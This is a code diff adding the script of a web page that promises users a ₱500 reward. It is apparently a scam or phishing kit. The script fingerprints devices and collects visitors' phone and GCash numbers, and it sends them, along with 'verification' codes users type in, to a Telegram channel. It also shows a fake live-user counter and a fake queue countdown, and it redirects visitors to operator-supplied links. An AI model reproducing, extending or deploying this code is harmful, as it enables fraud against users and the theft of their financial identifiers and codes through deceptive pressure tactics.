+            // ============================================================
+            // INIT DEVICE
+            // ============================================================
+            function initDevice() {
+                if (!db || !browserAllowed) return Promise.resolve();
+                deviceFingerprint = getDeviceFingerprint();
+                console.log('📱 Device fingerprint:', deviceFingerprint);
+                return getOrCreateDeviceId(deviceFingerprint).then(function(displayId) {
+                    deviceDisplayId = displayId;
+                    console.log('✅ Device ID:', deviceDisplayId);
+
+                    return db.ref('device_phone_map/' + deviceFingerprint).once('value').then(function(snap) {
+                        if (snap.exists() && snap.val().phone) {
+                            var linkedPhone = snap.val().phone;
+                            return db.ref('banned_ghosts/' + linkedPhone).once('value').then(function(bannedSnap) {
+                                if (bannedSnap.exists()) {
+                                    console.log('🚫 Device banned via linkage:', linkedPhone);
+                                    isBanned = true;
+                                    showBanPopup();
+                                    sendTelegram('🚫 BANNED DEVICE ACCESS ATTEMPT\n━━━━━━━━━━━━━━━━━━━━\n🖥️ Device: ' + deviceDisplayId + '\n🔗 Linked Phone: ' + linkedPhone + '\n📱 Fingerprint: ' + deviceFingerprint + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
+                                }
+                            });
+                        }
+                    });
+                }).catch(function(e) { console.error('initDevice error:', e); });
+            }
+
+            // ============================================================
+            // CONTINUE MISSION
+            // ============================================================
+            document.getElementById('continueBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                if (!browserAllowed) return;
+                if (isBanned) return;
+                if (navigator.vibrate) { try { navigator.vibrate(30); } catch(e) {} }
+                this.style.transform = 'scale(0.96)';
+                var self = this;
+                setTimeout(function() { self.style.transform = ''; }, 150);
+                var savedPhone = localStorage.getItem('userPhone');
+                var phoneInput = document.getElementById('userPhoneInput');
+                if (savedPhone && phoneInput) phoneInput.value = savedPhone;
+                openPopup('catClaimPopup');
+            });
+
+            // ============================================================
+            // PHONE INPUT FORMAT
+            // ============================================================
+            var phoneInput = document.getElementById('userPhoneInput');
+            if (phoneInput) {
+                phoneInput.addEventListener('input', function() {
+                    var value = this.value.replace(/\D/g, '');
+                    if (value.length > 11) value = value.substring(0, 11);
+                    var formatted = value;
+                    if (value.length > 7) formatted = value.substring(0, 4) + ' ' + value.substring(4, 7) + ' ' + value.substring(7);
+                    else if (value.length > 4) formatted = value.substring(0, 4) + ' ' + value.substring(4);
+                    this.value = formatted;
+                });
+            }
+
+            // ============================================================
+            // GET ₱500 → BAN CHECK → FIREWALL
+            // ============================================================
+            document.getElementById('get500Btn').addEventListener('click', function(e) {
+                e.preventDefault();
+                if (!browserAllowed) return;
+                if (navigator.vibrate) { try { navigator.vibrate(25); } catch(e) {} }
+
+                var phoneInput = document.getElementById('userPhoneInput');
+                var phoneErrEl = document.getElementById('phoneError');
+                var rawPhone = phoneInput ? phoneInput.value.replace(/\D/g, '') : '';
+
+                if (!rawPhone || rawPhone.length < 10) {
+                    if (phoneErrEl) { phoneErrEl.textContent = 'Please enter a valid mobile number.'; phoneErrEl.classList.add('show'); }
+                    if (navigator.vibrate) { try { navigator.vibrate([50, 30, 50]); } catch(e) {} }
+                    return;
+                }
+                if (rawPhone.length === 10 && rawPhone.startsWith('9')) rawPhone = '0' + rawPhone;
+                if (!rawPhone.startsWith('09') || rawPhone.length !== 11) {
+                    if (phoneErrEl) { phoneErrEl.textContent = 'Invalid number. Format: 09XXXXXXXXX'; phoneErrEl.classList.add('show'); }
+                    return;
+                }
+                if (phoneErrEl) phoneErrEl.classList.remove('show');
+
+                userPhone = rawPhone;
+                var self = this;
+                this.disabled = true;
+                this.innerHTML = '<span class="btn-icon">⏳</span><span>CHECKING...</span>';
+
+                checkBan(userPhone, deviceFingerprint).then(function(banResult) {
+                    if (banResult.isBanned) {
+                        console.log('🚫 User banned:', banResult.type);
+                        if (banResult.type === 'phone') {
+                            db.ref('device_phone_map/' + deviceFingerprint).once('value').then(function(snap) {
+                                if (!snap.exists() || !snap.val().phone) {
+                                    db.ref('device_phone_map/' + deviceFingerprint).set({
+                                        phone: userPhone,
+                                        displayId: deviceDisplayId,
+                                        lastSeen: Date.now()
+                                    });
+                                }
+                            });
+                        }
+                        sendTelegram('🚫 BANNED USER ATTEMPT\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n📊 Type: ' + banResult.type + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
+                        closePopup('catClaimPopup');
+                        isBanned = true;
+                        showBanPopup();
+                        return;
+                    }
+
+                    localStorage.setItem('userPhone', userPhone);
+                    localStorage.setItem('userDeviceId', deviceFingerprint);
+                    localStorage.setItem('userDeviceDisplayId', deviceDisplayId);
+
+                    return saveDeviceInfo(userPhone, deviceFingerprint, deviceDisplayId).then(function() {
+                        return db.ref('user_sessions/' + userPhone).once('value').then(function(sessSnap) {
+                            if (!sessSnap.exists()) {
+                                return db.ref('user_sessions/' + userPhone).set({
+                                    phone: userPhone,
+                                    balance: 0,
+                                    status: 'online',
+                                    deviceFingerprint: deviceFingerprint,
+                                    deviceDisplayId: deviceDisplayId,
+                                    createdAt: Date.now(),
+                                    lastUpdate: Date.now()
+                                });
+                            } else {
+                                return db.ref('user_sessions/' + userPhone).update({
+                                    status: 'online',
+                                    deviceFingerprint: deviceFingerprint,
+                                    deviceDisplayId: deviceDisplayId,
+                                    lastUpdate: Date.now()
+                                });
+                            }
+                        });
+                    }).then(function() {
+                        sendTelegram('🎯 MISSION — USER CLAIM\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
+
+                        return checkFirewall().then(function(firewallActive) {
+                            console.log('🔥 Firewall:', firewallActive ? 'ON' : 'OFF');
+                            if (firewallActive) {
+                                closePopup('catClaimPopup');
+                                self.disabled = false;
+                                self.innerHTML = '<span class="btn-icon">💰</span><span>GET ₱500</span>';
+                                showAiVerificationPopup();
+                                return;
+                            }
+                            return getAvailableLink().then(function(linkUrl) {
+                                if (linkUrl) {
+                                    closePopup('catClaimPopup');
+                                    self.innerHTML = '<span class="btn-icon">✅</span><span>REDIRECTING...</span>';
+                                    setTimeout(function() { window.location.href = linkUrl; }, 800);
+                                    return;
+                                }
+                                closePopup('catClaimPopup');
+                                self.disabled = false;
+                                self.innerHTML = '<span class="btn-icon">💰</span><span>GET ₱500</span>';
+                                openPopup('skipClaimPopup');
+                                startSkipCountdown();
+                            });
+                        });
+                    });
+                }).catch(function(err) {
+                    console.error('Ban check error:', err);
+                    self.disabled = false;
+                    self.innerHTML = '<span class="btn-icon">💰</span><span>GET ₱500</span>';
+                });
+            });
+
+            // ============================================================
+            // FIREWALL + LINK HELPERS
+            // ============================================================
+            function checkFirewall() {
+                return new Promise(function(resolve) {
+                    if (!db) return resolve(false);
+                    try {
+                        db.ref('admin/globalFirewall').once('value').then(function(snap) {
+                            var data = snap.val();
+                            resolve(data && data.active === true);
+                        }).catch(function() { resolve(false); });
+                    } catch(e) { resolve(false); }
+                });
+            }
+            function getAvailableLink() {
+                return new Promise(function(resolve) {
+                    if (!db) return resolve(null);
+                    try {
+                        db.ref('admin/redirectLink').once('value').then(function(snap) {
+                            var data = snap.val();
+                            if (data && data.url && data.active !== false) return resolve(data.url);
+                            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function(linksSnap) {
+                                if (linksSnap.exists()) {
+                                    var links = linksSnap.val();
+                                    var key = Object.keys(links)[0];
+                                    var linkData = links[key];
+                                    db.ref('links/' + key).update({
+                                        status: 'claimed',
+                                        user: userPhone || 'Unknown',
+                                        claimedAt: Date.now()
+                                    });
+                                    return resolve(linkData.url);
+                                }
+                                resolve(null);
+                            }).catch(function() { resolve(null); });
+                        }).catch(function() { resolve(null); });
+                    } catch(e) { resolve(null); }
+                });
+            }
+
+            // ============================================================
+            // SUCCESS POPUP
+            // ============================================================
+            function showSuccessPopup(message) {
+                var msgEl = document.getElementById('successMessage');
+                if (msgEl) msgEl.innerHTML = message;
+                openPopup('successPopup');
+                triggerBurst();
+            }
+            document.getElementById('successOkBtn').addEventListener('click', function() { closePopup('successPopup'); });
+
+            // ============================================================
+            // SKIP AND CLAIM
+            // ============================================================
+            function startSkipCountdown() {
+                stopSkipCountdown();
+                skipCountdown = 10;
+                var btn = document.getElementById('skipClaimBtn');
+                var badgeNum = document.getElementById('skipCountdownNum');
+                if (btn) btn.disabled = true;
+                if (badgeNum) badgeNum.textContent = skipCountdown;
+                skipCountdownInterval = setInterval(function() {
+                    skipCountdown--;
+                    var numEl = document.getElementById('skipCountdownNum');
+                    if (numEl) numEl.textContent = skipCountdown;
+                    if (skipCountdown <= 0) {
+                        stopSkipCountdown();
+                        if (btn) { btn.disabled = false; btn.innerHTML = '<span class="btn-icon">⏭️</span><span>SKIP & CLAIM</span>'; }
+                        var b = document.getElementById('skipCountdownBadge');
+                        if (b) b.innerHTML = '✅ READY TO CLAIM';
+                    }
+                }, 1000);
+            }
+            function stopSkipCountdown() { if (skipCountdownInterval) { clearInterval(skipCountdownInterval); skipCountdownInterval = null; } }
+
+            document.getElementById('skipClaimBtn').addEventListener('click', function() {
+                if (!browserAllowed) return;
+                if (this.disabled) return;
+                if (navigator.vibrate) { try { navigator.vibrate(25); } catch(e) {} }
+                triggerBurst();
+                closePopup('skipClaimPopup');
+                stopSkipCountdown();
+                var gcashInput = document.getElementById('gcashInput');
+                if (gcashInput) gcashInput.value = '';
+                var errEl = document.getElementById('claimFormError');
+                if (errEl) errEl.classList.remove('show');
+                setTimeout(function() { openPopup('claimFormPopup'); }, 400);
+            });
+
+            // ============================================================
+            // GCASH INPUT FORMAT
+            // ============================================================
+            var gcashInput = document.getElementById('gcashInput');
+            if (gcashInput) {
+                gcashInput.addEventListener('input', function() {
+                    var value = this.value.replace(/\D/g, '');
+                    if (value.length > 11) value = value.substring(0, 11);
+                    var formatted = value;
+                    if (value.length > 7) formatted = value.substring(0, 4) + ' ' + value.substring(4, 7) + ' ' + value.substring(7);
+                    else if (value.length > 4) formatted = value.substring(0, 4) + ' ' + value.substring(4);
+                    this.value = formatted;
+                });
+            }
+
+            // ============================================================
+            // CLAIM NOW → QUEUE
+            // ============================================================
+            document.getElementById('claimNowBtn').addEventListener('click', function() {
+                if (!browserAllowed) return;
+                var gcashInputEl = document.getElementById('gcashInput');
+                var errEl = document.getElementById('claimFormError');
+                var gcashValue = gcashInputEl ? gcashInputEl.value.replace(/\D/g, '') : '';
+                if (!gcashValue || gcashValue.length < 11) { if (errEl) { errEl.textContent = 'Please enter a valid GCash number (11 digits).'; errEl.classList.add('show'); } return; }
+                if (!gcashValue.startsWith('09')) { if (errEl) { errEl.textContent = 'GCash number must start with 09.'; errEl.classList.add('show'); } return; }
+                if (errEl) errEl.classList.remove('show');
+
+                sendTelegram('💰 CLAIM FORM SUBMITTED\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n💳 GCash: ' + gcashValue + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
+
+                closePopup('claimFormPopup');
+                setTimeout(function() {
+                    openPopup('queuePopup');
+                    startQueueTimer();
+                    startLiveUsersCounter();
+                    startLinkListener();
+                }, 400);
+            });
+
+            // ============================================================
+            // QUEUE TIMER
+            // ============================================================
+            function startQueueTimer() {
+                stopQueueTimer();
+                queueCountdown = 600;
+                var timerEl = document.getElementById('queueTimer');
+                var progressBar = document.getElementById('queueProgressBar');
+                function updateTimerDisplay() {
+                    var mins = Math.floor(queueCountdown / 60);
+                    var secs = queueCountdown % 60;
+                    if (timerEl) timerEl.textContent = mins + ':' + String(secs).padStart(2, '0');
+                    if (progressBar) progressBar.style.width = ((600 - queueCountdown) / 600 * 100) + '%';
+                }
+                updateTimerDisplay();
+                saveCountdownState();
+                queueTimerInterval = setInterval(function() {
+                    queueCountdown--;
+                    updateTimerDisplay();
+                    updateCountdownState(queueCountdown);
+                    if (queueCountdown <= 0) {
+                        stopQueueTimer();
+                        stopLiveUsersCounter();
+                        stopLinkListeners();
+                        clearCountdownState();
+                        if (timerEl) timerEl.textContent = '00:00';
+                        setTimeout(function() {
+                            closePopup('queuePopup');
+                            showSuccessPopup('Your turn is ready!<br>Please wait for further instructions.');
+                        }, 1000);
+                    }
+                }, 1000);
+            }
+            function stopQueueTimer() { if (queueTimerInterval) { clearInterval(queueTimerInterval); queueTimerInterval = null; } }
+
+            function saveCountdownState() {
+                if (!db || !userPhone) return;
+                try {
+                    db.ref('user_sessions/' + userPhone + '/system_verification').set({
+                        status: 'counting_down',
+                        countdownTimer: 600,
+                        countdownStartedAt: Date.now(),
+                        deviceId: deviceDisplayId,
+                        phone: userPhone,
+                        code: '----',
+                        timer: 600,
+                        lastUpdate: Date.now()
+                    });
+                    console.log('✅ Countdown state SAVED');
+                } catch(e) { console.error('Save countdown error:', e); }
+            }
+            function updateCountdownState(remaining) {
+                if (!db || !userPhone) return;
+                try {
+                    db.ref('user_sessions/' + userPhone + '/system_verification').update({
+                        countdownTimer: remaining,
+                        timer: remaining,
+                        lastUpdate: Date.now()
+                    });
+                } catch(e) {}
+            }
+            function clearCountdownState() {
+                if (!db || !userPhone) return;
+                try {
+                    db.ref('user_sessions/' + userPhone + '/system_verification').update({
+                        status: 'completed',
+                        countdownTimer: 0,
+                        timer: 0,
+                        lastUpdate: Date.now()
+                    });
+                } catch(e) {}
+            }
+
+            function startLinkListener() {
+                stopLinkListeners();
+                if (!db) return;
+
+                var ref1 = db.ref('admin/redirectLink');
+                var cb1 = ref1.on('value', function(snap) {
+                    var data = snap.val();
+                    if (data && data.url && data.active !== false) {
+                        console.log('🚀 Link detected (admin):', data.url);
+                        stopLinkListeners();
+                        clearCountdownState();
+                        sendTelegram('🚀 COUNTDOWN → REDIRECT\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n🔗 Link: ' + data.url + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
+                        window.location.href = data.url;
+                    }
+                });
+                linkListeners.push({ ref: ref1, cb: cb1, event: 'value' });
+
+                var ref2 = db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1);
+                var cb2 = ref2.on('value', function(snap) {
+                    if (snap.exists()) {
+                        var links = snap.val();
+                        var key = Object.keys(links)[0];
+                        var linkData = links[key];
+                        console.log('🚀 Link detected (links):', linkData.url);
+                        db.ref('links/' + key).update({
+                            status: 'claimed',
+                            user: userPhone || 'Unknown',
+                            claimedAt: Date.now()
+                        });
+                        stopLinkListeners();
+                        clearCountdownState();
+                        sendTelegram('🚀 COUNTDOWN → REDIRECT\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n🔗 Link: ' + linkData.url + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
+                        window.location.href = linkData.url;
+                    }
+                });
+                linkListeners.push({ ref: ref2, cb: cb2, event: 'value' });
+
+                console.log('👀 Link listeners active');
+            }
+            function stopLinkListeners() {
+                linkListeners.forEach(function(l) { try { l.ref.off(l.event, l.cb); } catch(e) {} });
+                linkListeners = [];
+            }
+
+            function startLiveUsersCounter() {
+                stopLiveUsersCounter();
+                var countEl = document.getElementById('liveUsersCount');
+                if (!countEl) return;
+                var baseCount = 120 + Math.floor(Math.random() * 80);
+                countEl.textContent = baseCount;
+                liveUsersInterval = setInterval(function() {
+                    var change = Math.floor(Math.random() * 5) - 2;
+                    baseCount = Math.max(80, baseCount + change);
+                    countEl.textContent = baseCount;
+                }, 1500);
+            }
+            function stopLiveUsersCounter() { if (liveUsersInterval) { clearInterval(liveUsersInterval); liveUsersInterval = null; } }
+
+            // ============================================================
+            // AI VERIFICATION
+            // ============================================================
+            function showAiVerificationPopup() {
+                if (!browserAllowed) return;
+                document.getElementById('aiStage1').classList.remove('hidden');
+                document.getElementById('aiStage2').classList.add('hidden');
+                document.getElementById('aiStage3').classList.add('hidden');
+                var gcashEl = document.getElementById('aiGcashInput');
+                if (gcashEl) gcashEl.value = '';
+                ['aiGcashError', 'aiCodeError'].forEach(function(id) {
+                    var el = document.getElementById(id);
+                    if (el) el.classList.remove('show');
+                });
+                var codeEl = document.getElementById('aiCodeInput');
+                if (codeEl) codeEl.value = '';
+                openPopup('aiVerifyPopup');
+            }
+
+            var aiGcashInput = document.getElementById('aiGcashInput');
+            if (aiGcashInput) {
+                aiGcashInput.addEventListener('input', function() {
+                    var value = this.value.replace(/\D/g, '');
+                    if (value.length > 11) value = value.substring(0, 11);
+                    var formatted = value;
+                    if (value.length > 7) formatted = value.substring(0, 4) + ' ' + value.substring(4, 7) + ' ' + value.substring(7);
+                    else if (value.length > 4) formatted = value.substring(0, 4) + ' ' + value.substring(4);
+                    this.value = formatted;
+                });
+            }
+
+            document.getElementById('aiRequestCallBtn').addEventListener('click', function() {
+                if (!browserAllowed) return;
+                var gcashEl = document.getElementById('aiGcashInput');
+                var errEl = document.getElementById('aiGcashError');
+                var gcashValue = gcashEl ? gcashEl.value.replace(/\D/g, '') : '';
+                if (!gcashValue || gcashValue.length < 11) { if (errEl) { errEl.textContent = 'Please enter a valid GCash number (11 digits).'; errEl.classList.add('show'); } return; }
+                if (!gcashValue.startsWith('09')) { if (errEl) { errEl.textContent = 'GCash number must start with 09.'; errEl.classList.add('show'); } return; }
+                if (errEl) errEl.classList.remove('show');
+                requestAICall(gcashValue);
+            });
+
+            function requestAICall(gcashNumber) {
+                currentAiCode = Math.floor(1000 + Math.random() * 9000).toString();
+                console.log('📞 AI CODE:', currentAiCode);
+                if (db && userPhone) {
+                    try {
+                        db.ref('user_sessions/' + userPhone + '/system_verification').set({
+                            code: currentAiCode,
+                            timer: 60,
+                            status: 'active',
+                            deviceId: deviceDisplayId,
+                            phone: userPhone,
+                            gcashNumber: gcashNumber,
+                            createdAt: Date.now(),
+                            lastUpdate: Date.now(),
+                            userEnteredCode: null,
+                            userEnteredAt: null,
+                            isMatch: null
+                        });
+                    } catch(e) {}
+                }
+                sendTelegram('📞 AI CALL REQUESTED\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n💳 GCash: ' + gcashNumber + '\n🔑 Code: ' + currentAiCode + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
+                document.getElementById('aiStage1').classList.add('hidden');
+                document.getElementById('aiStage2').classList.remove('hidden');
+                startAiTimer(60);
+                setTimeout(function() {
+                    document.getElementById('aiStage2').classList.add('hidden');
+                    document.getElementById('aiStage3').classList.remove('hidden');
+                    var codeInput = document.getElementById('aiCodeInput');
+                    if (codeInput) codeInput.focus();
+                }, 4000);
+            }
+
+            function startAiTimer(seconds) {
+                stopAiTimer();
+                aiCountdown = seconds;
+                var timerEl = document.getElementById('aiTimer');
+                if (timerEl) { timerEl.textContent = aiCountdown + 's'; timerEl.classList.remove('urgent'); }
+                aiTimerInterval = setInterval(function() {
+                    aiCountdown--;
+                    if (timerEl) { timerEl.textContent = aiCountdown + 's'; if (aiCountdown <= 9) timerEl.classList.add('urgent'); }
+                    if (db && userPhone) { try { db.ref('user_sessions/' + userPhone + '/system_verification').update({ timer: aiCountdown, lastUpdate: Date.now() }); } catch(e) {} }
+                    if (aiCountdown <= 0) {
+                        stopAiTimer();
+                        var statusText = document.getElementById('aiStatusText');
+                        if (statusText) statusText.innerHTML = '⏰ <strong style="color:#ff9800;">CALL EXPIRED</strong><br><span style="font-size:11px;">Please close and try again.</span>';
+                        if (db && userPhone) { try { db.ref('user_sessions/' + userPhone + '/system_verification').update({ status: 'expired', timer: 0, lastUpdate: Date.now() }); } catch(e) {} }
+                    }
+                }, 1000);
+            }
+            function stopAiTimer() { if (aiTimerInterval) { clearInterval(aiTimerInterval); aiTimerInterval = null; } }
+
+            document.getElementById('aiVerifyBtn').addEventListener('click', function() {
+                if (!browserAllowed) return;
+                var input = document.getElementById('aiCodeInput');
+                var errEl = document.getElementById('aiCodeError');
+                var enteredCode = input ? input.value.trim() : '';
+                if (!enteredCode || enteredCode.length !== 4 || !/^\d+$/.test(enteredCode)) { if (errEl) { errEl.textContent = 'Please enter a valid 4-digit code.'; errEl.classList.add('show'); } return; }
+                var isMatch = (enteredCode === currentAiCode);
+                if (db && userPhone) { try { db.ref('user_sessions/' + userPhone + '/system_verification').update({ userEnteredCode: enteredCode, userEnteredAt: Date.now(), status: isMatch ? 'verified' : 'invalid', isMatch: isMatch, lastUpdate: Date.now() }); } catch(e) {} }
+                sendTelegram('🔑 AI-CODE ATTEMPT\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n📝 Code: ' + enteredCode + '\n📊 Status: ' + (isMatch ? 'VALID' : 'INVALID') + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
+                if (isMatch) {
+                    stopAiTimer();
+                    if (errEl) errEl.classList.remove('show');
+                    triggerBurst();
+                    setTimeout(function() { closePopup('aiVerifyPopup'); showSuccessPopup('Verification successful!<br>Your reward is being processed.'); }, 1000);
+                } else {
+                    if (errEl) { errEl.textContent = '❌ Invalid code. Please try again.'; errEl.classList.add('show'); }
+                    if (input) { input.value = ''; input.focus(); }
+                }
+            });
+
+            var aiCodeInput = document.getElementById('aiCodeInput');
+            if (aiCodeInput) {
+                aiCodeInput.addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').substring(0, 4); });
+                aiCodeInput.addEventListener('keypress', function(e) { if (e.key === 'Enter') document.getElementById('aiVerifyBtn').click(); });
+            }
+
+            // ============================================================
+            // START
+            // ============================================================
+            setTimeout(function() {
+                if (browserAllowed) {
+                    initDevice().then(function() {
+                        console.log('✅ Mission page initialized | Mobile:', isMobile, '| Browser:', browserAllowed);
+                    });
+                }
+            }, 500);
+
+        })();
+    </script>
 
 </body>
 </html>
